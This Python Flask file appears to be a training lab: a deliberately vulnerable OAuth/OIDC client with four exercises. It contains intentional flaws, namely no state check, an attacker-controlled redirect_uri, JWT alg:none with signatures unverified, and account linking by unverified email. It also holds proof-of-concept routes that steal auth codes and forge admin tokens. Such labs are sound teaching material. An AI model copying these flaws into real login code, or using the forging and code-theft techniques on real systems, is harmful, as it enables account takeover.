#!/usr/bin/env python3
"""
==============================================================
 SSO Vulnerability Lab — Vulnerable OAuth 2.0 / OIDC Client
==============================================================
 OAUTH_SERVER_URL  → container-to-container API calls
                     (token exchange, userinfo, JWKS)
 OAUTH_BROWSER_URL → what YOUR browser is redirected to
                     (always localhost:4000)
 APP_BASE_URL      → this app's public URL for callbacks
                     (always localhost:5000)
==============================================================
"""

import os, base64, json, time, secrets
from urllib.parse import urlencode, urlparse, parse_qs
from functools import wraps

import requests as http_requests
import jwt
from flask import (Flask, request, redirect, session,
                   render_template_string, jsonify)

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "client-app-secret")

# Internal: used for server-to-server API calls (token exchange, userinfo, JWKS)
OAUTH_SERVER_URL  = os.getenv("OAUTH_SERVER_URL",  "http://oauth-server:4000")
# Browser-visible: used when redirecting the USER's browser to the OAuth server
OAUTH_BROWSER_URL = os.getenv("OAUTH_BROWSER_URL", "http://localhost:4000")

CLIENT_ID        = os.getenv("CLIENT_ID",     "vulnerable-client")
CLIENT_SECRET    = os.getenv("CLIENT_SECRET", "client-secret-abc123")
APP_BASE_URL     = os.getenv("APP_BASE_URL",  "http://localhost:5000")

# ── Simulated local user database ────────────────────────────
APP_USERS = {
    "alice@lab.local":  {"name": "Alice Admin", "role": "admin"},
    "bob@lab.local":    {"name": "Bob User",    "role": "user"},
    "victim@lab.local": {"name": "Victim",      "role": "user"},
}

# ── OIDC helper: use internal URL for API, browser URL for redirects ─
def get_auth_endpoint():
    """Authorization endpoint — browser-visible (localhost)."""
    return f"{OAUTH_BROWSER_URL}/oauth/authorize"

def get_token_endpoint():
    """Token endpoint — server-to-server (internal)."""
    return f"{OAUTH_SERVER_URL}/oauth/token"

def get_userinfo_endpoint():
    """UserInfo endpoint — server-to-server (internal)."""
    return f"{OAUTH_SERVER_URL}/oauth/userinfo"

def get_jwks():
    try:
        r = http_requests.get(f"{OAUTH_SERVER_URL}/oauth/jwks", timeout=5)
        return r.json()
    except Exception:
        return {"keys": []}

def exchange_code(code, redirect_uri):
    r = http_requests.post(get_token_endpoint(), data={
        "grant_type":    "authorization_code",
        "code":          code,
        "redirect_uri":  redirect_uri,
        "client_id":     CLIENT_ID,
        "client_secret": CLIENT_SECRET,
    }, timeout=10)
    return r.json()

def get_userinfo(access_token):
    r = http_requests.get(get_userinfo_endpoint(),
        headers={"Authorization": f"Bearer {access_token}"}, timeout=5)
    return r.json()

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.get("user"):
            return redirect("/")
        return f(*args, **kwargs)
    return wrapper

# ── HTML ─────────────────────────────────────────────────────
BASE_CSS = """<style>
body{background:#0d1117;color:#c9d1d9;font-family:monospace;margin:0;padding:20px}
a{color:#58a6ff}.box{max-width:700px;margin:0 auto}h1{color:#58a6ff}h2{color:#79c0ff}
.lab{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin:16px 0}
.vuln{color:#f85149;font-weight:bold}
.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;margin-left:8px}
.red{background:#b91c1c}.yellow{background:#b45309}
a.btn{background:#238636;border:none;color:white;padding:8px 16px;border-radius:5px;
  text-decoration:none;display:inline-block;margin-top:8px}
pre{background:#0d1117;border:1px solid #30363d;padding:12px;border-radius:5px;
  overflow-x:auto;font-size:12px;white-space:pre-wrap}
.err{color:#f85149;background:#161b22;padding:12px;border-radius:5px;margin:8px 0}
</style>"""

INDEX_HTML = BASE_CSS + """
<div class="box">
<h1>⚠ Vulnerable OAuth 2.0 / OIDC Client</h1>
<div class="lab">
  <h2>Lab 4 — OAuth CSRF (Missing State) <span class="badge red">HIGH</span></h2>
  <p class="vuln">⚠ No state parameter — CSRF causes account linkage takeover.</p>
  <a href="/lab4/login" class="btn">Start Lab 4 →</a>
  &nbsp;<a href="/lab4/csrf_poc" class="btn" style="background:#b45309">CSRF PoC →</a>
</div>
<div class="lab">
  <h2>Lab 5 — Open redirect_uri <span class="badge red">CRITICAL</span></h2>
  <p class="vuln">⚠ redirect_uri taken from attacker input → auth code stolen.</p>
  <a href="/lab5/login" class="btn">Start Lab 5 →</a>
  &nbsp;<a href="/lab5/login?redirect_uri=http://localhost:5000/lab5/steal" class="btn" style="background:#b45309">Attack URL →</a>
</div>
<div class="lab">
  <h2>Lab 6 — JWT alg:none <span class="badge red">CRITICAL</span></h2>
  <p class="vuln">⚠ Server accepts unsigned JWT — forge any identity.</p>
  <a href="/lab6/login" class="btn">Start Lab 6 →</a>
  &nbsp;<a href="/lab6/forge?email=alice@lab.local&role=admin" class="btn" style="background:#b45309">Forge Token →</a>
</div>
<div class="lab">
  <h2>Lab 7 — SSO Email Trust ATO <span class="badge red">CRITICAL</span></h2>
  <p class="vuln">⚠ App links OAuth identity by email without verifying ownership.</p>
  <a href="/lab7/login" class="btn">Start Lab 7 →</a>
</div>
</div>"""

DASHBOARD_HTML = BASE_CSS + """
<div class="box">
<h1>✅ Authenticated — OAuth Dashboard</h1>
<div class="lab">
  <h2>Session Info</h2>
  <pre>Email  : {{ email }}
Name   : {{ name }}
Role   : {{ role }}
Lab    : {{ lab }}
Method : {{ method }}</pre>
  {% if role == 'admin' %}<p class="vuln">🚨 Admin access granted!</p>{% endif %}
  {% if warn %}<p class="vuln">⚠ {{ warn }}</p>{% endif %}
</div>
<a href="/logout" class="btn">Logout</a>&nbsp;<a href="/" class="btn">Back to Labs</a>
</div>"""

# ── Routes ────────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

@app.route("/dashboard")
@login_required
def dashboard():
    return render_template_string(DASHBOARD_HTML, **session["user"])

# ─────────────────────────────────────────────────────────────
#  LAB 4 — OAuth CSRF (Missing State)
# ─────────────────────────────────────────────────────────────
@app.route("/lab4/login")
def lab4_login():
    redirect_uri = f"{APP_BASE_URL}/lab4/callback"
    params = {
        "response_type": "code",
        "client_id":     CLIENT_ID,
        "redirect_uri":  redirect_uri,
        "scope":         "openid email profile",
        # ⚠️  state= INTENTIONALLY MISSING
    }
    return redirect(f"{get_auth_endpoint()}?{urlencode(params)}")

@app.route("/lab4/callback")
def lab4_callback():
    code = request.args.get("code", "")
    # ⚠️  No state verification at all
    if not code:
        return render_template_string(BASE_CSS +
            '<div class="err">No code received.</div>')

    redirect_uri = f"{APP_BASE_URL}/lab4/callback"
    tokens = exchange_code(code, redirect_uri)
    if "error" in tokens:
        return render_template_string(BASE_CSS +
            f'<div class="err">Token error: {tokens}</div>')

    userinfo = get_userinfo(tokens.get("access_token", ""))
    session["user"] = {
        "email":  userinfo.get("email", ""),
        "name":   userinfo.get("name", ""),
        "role":   userinfo.get("role", "user"),
        "lab":    "Lab 4 — OAuth CSRF (no state)",
        "method": "OAuth code — state param missing & unchecked",
        "warn":   "",
    }
    return redirect("/dashboard")

@app.route("/lab4/csrf_poc")
def lab4_csrf_poc():
    params = {
        "response_type": "code",
        "client_id":     CLIENT_ID,
        "redirect_uri":  f"{APP_BASE_URL}/lab4/callback",
        "scope":         "openid email profile",
    }
    csrf_url = f"{get_auth_endpoint()}?{urlencode(params)}"
    return render_template_string(BASE_CSS + f"""
<div class="box"><h2>Lab 4 — CSRF PoC</h2>
<div class="lab">
<p class="vuln">🎯 Send this URL to the victim (no state = CSRF possible):</p>
<pre>{csrf_url}</pre>
<p>When victim visits this and is already logged into the OAuth server,
their browser completes the flow — attacker's identity gets linked.</p>
<a href="{csrf_url}" class="btn">Simulate victim click →</a>
</div></div>""")

# ─────────────────────────────────────────────────────────────
#  LAB 5 — Open redirect_uri
# ─────────────────────────────────────────────────────────────
@app.route("/lab5/login")
def lab5_login():
    # ⚠️  redirect_uri taken from attacker-controlled query param
    attacker_uri = request.args.get("redirect_uri",
                                    f"{APP_BASE_URL}/lab5/callback")
    state = secrets.token_urlsafe(16)
    session["lab5_state"] = state
    params = {
        "response_type": "code",
        "client_id":     CLIENT_ID,
        "redirect_uri":  attacker_uri,   # ← ATTACKER-CONTROLLED
        "scope":         "openid email profile",
        "state":         state,
    }
    return redirect(f"{get_auth_endpoint()}?{urlencode(params)}")

@app.route("/lab5/callback")
def lab5_callback():
    code = request.args.get("code", "")
    if not code:
        return render_template_string(BASE_CSS +
            '<div class="err">No code. Use attack URL: '
            '<a href="/lab5/login?redirect_uri=http://localhost:5000/lab5/steal">'
            'click here</a></div>')

    tokens = exchange_code(code, f"{APP_BASE_URL}/lab5/callback")
    if "error" in tokens:
        return render_template_string(BASE_CSS +
            f'<div class="err">Token error: {tokens}</div>')

    userinfo = get_userinfo(tokens.get("access_token", ""))
    session["user"] = {
        "email":  userinfo.get("email", ""),
        "name":   userinfo.get("name", ""),
        "role":   userinfo.get("role", "user"),
        "lab":    "Lab 5 — Open redirect_uri",
        "method": "OAuth code (redirect_uri from user input)",
        "warn":   "",
    }
    return redirect("/dashboard")

@app.route("/lab5/steal")
def lab5_steal():
    """Simulates attacker's server receiving the leaked auth code."""
    code  = request.args.get("code", "")
    state = request.args.get("state", "")
    # Now exchange with the attacker's redirect_uri
    tokens = {}
    if code:
        tokens = exchange_code(code, f"{APP_BASE_URL}/lab5/steal")

    return render_template_string(BASE_CSS + f"""
<div class="box">
<h2 style="color:#f85149">💀 Attacker Server — Code Captured!</h2>
<div class="lab">
<pre>Authorization Code : {code}
State              : {state}
Tokens received    : {json.dumps(tokens, indent=2)}</pre>
<p class="vuln">Code stolen! Tokens exchanged successfully as the victim.</p>
</div></div>""")

# ─────────────────────────────────────────────────────────────
#  LAB 6 — JWT alg:none
# ─────────────────────────────────────────────────────────────
@app.route("/lab6/login")
def lab6_login():
    state = secrets.token_urlsafe(16)
    session["lab6_state"] = state
    params = {
        "response_type": "code",
        "client_id":     CLIENT_ID,
        "redirect_uri":  f"{APP_BASE_URL}/lab6/callback",
        "scope":         "openid email profile",
        "state":         state,
    }
    return redirect(f"{get_auth_endpoint()}?{urlencode(params)}")

@app.route("/lab6/callback")
def lab6_callback():
    code = request.args.get("code", "")
    if not code:
        return render_template_string(BASE_CSS + '<div class="err">No code.</div>')

    tokens = exchange_code(code, f"{APP_BASE_URL}/lab6/callback")
    if "error" in tokens:
        return render_template_string(BASE_CSS +
            f'<div class="err">Token error: {tokens}</div>')

    id_token = tokens.get("id_token", "")
    # ⚠️  VULNERABLE: accepts any algorithm including none
    try:
        claims = jwt.decode(id_token,
                            options={"verify_signature": False,
                                     "verify_exp": False},
                            algorithms=["RS256", "none", "HS256"])
    except Exception as e:
        return render_template_string(BASE_CSS +
            f'<div class="err">JWT decode failed: {e}</div>')

    session["user"] = {
        "email":  claims.get("email", ""),
        "name":   claims.get("name", ""),
        "role":   claims.get("role", "user"),
        "lab":    "Lab 6 — JWT alg:none",
        "method": "OIDC — signature NOT verified (alg:none accepted)",
        "warn":   "⚠ JWT signature was NOT verified!",
    }
    return redirect("/dashboard")

@app.route("/lab6/forge")
def lab6_forge():
    """Generate a forged JWT with alg:none for any identity."""
    target_email = request.args.get("email", "alice@lab.local")
    target_role  = request.args.get("role",  "admin")

    header  = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"},
                                        separators=(',', ':')))
    payload = b64url_encode(json.dumps({
        "iss":   OAUTH_BROWSER_URL,
        "sub":   "forged-uid",
        "aud":   CLIENT_ID,
        "email": target_email,
        "name":  "Forged User",
        "role":  target_role,
        "email_verified": True,
        "iat":   int(time.time()),
        "exp":   int(time.time()) + 3600,
    }, separators=(',', ':')))

    forged = f"{header}.{payload}."

    return render_template_string(BASE_CSS + f"""
<div class="box">
<h2 style="color:#f85149">🔓 Lab 6 — Forged JWT (alg:none)</h2>
<div class="lab">
<p class="vuln">Forged for: {target_email} / role: {target_role}</p>
<pre>{forged}</pre>
<p>Send to <code>GET /oauth/userinfo</code> as Bearer token, or submit
as id_token to the /lab6/callback endpoint.</p>
<p><b>Test it:</b></p>
<pre>curl -H "Authorization: Bearer {forged[:80]}..." http://localhost:4000/oauth/userinfo</pre>
</div>
<a href="/lab6/login" class="btn">Normal Lab 6 Login →</a>
</div>""")

# ─────────────────────────────────────────────────────────────
#  LAB 7 — SSO Account Takeover via Email Trust
# ─────────────────────────────────────────────────────────────
@app.route("/lab7/login")
def lab7_login():
    state = secrets.token_urlsafe(16)
    session["lab7_state"] = state
    params = {
        "response_type": "code",
        "client_id":     CLIENT_ID,
        "redirect_uri":  f"{APP_BASE_URL}/lab7/callback",
        "scope":         "openid email profile",
        "state":         state,
    }
    return redirect(f"{get_auth_endpoint()}?{urlencode(params)}")

@app.route("/lab7/callback")
def lab7_callback():
    code = request.args.get("code", "")
    if not code:
        return render_template_string(BASE_CSS + '<div class="err">No code.</div>')

    tokens = exchange_code(code, f"{APP_BASE_URL}/lab7/callback")
    if "error" in tokens:
        return render_template_string(BASE_CSS +
            f'<div class="err">Token error: {tokens}</div>')

    userinfo = get_userinfo(tokens.get("access_token", ""))
    idp_email          = userinfo.get("email", "").lower()
    idp_email_verified = userinfo.get("email_verified", False)

    # ⚠️  VULNERABLE: links by email, ignores email_verified
    existing = APP_USERS.get(idp_email)
    warn = ""
    if existing:
        role = existing["role"]
        name = existing["name"]
        if not idp_email_verified:
            warn = f"Account linked despite email_verified=False! ATO possible."
    else:
        role = userinfo.get("role", "user")
        name = userinfo.get("name", "")

    session["user"] = {
        "email":  idp_email,
        "name":   name,
        "role":   role,
        "lab":    "Lab 7 — Email Trust ATO",
        "method": f"OIDC → local account link (email_verified={idp_email_verified})",
        "warn":   warn,
    }
    return redirect("/dashboard")

if __name__ == "__main__":
    print(f"[OAuthClient] Starting on :5000")
    print(f"[OAuthClient] OAUTH_SERVER_URL (internal) = {OAUTH_SERVER_URL}")
    print(f"[OAuthClient] OAUTH_BROWSER_URL (redirect) = {OAUTH_BROWSER_URL}")
    app.run(host="0.0.0.0", port=5000, debug=False)
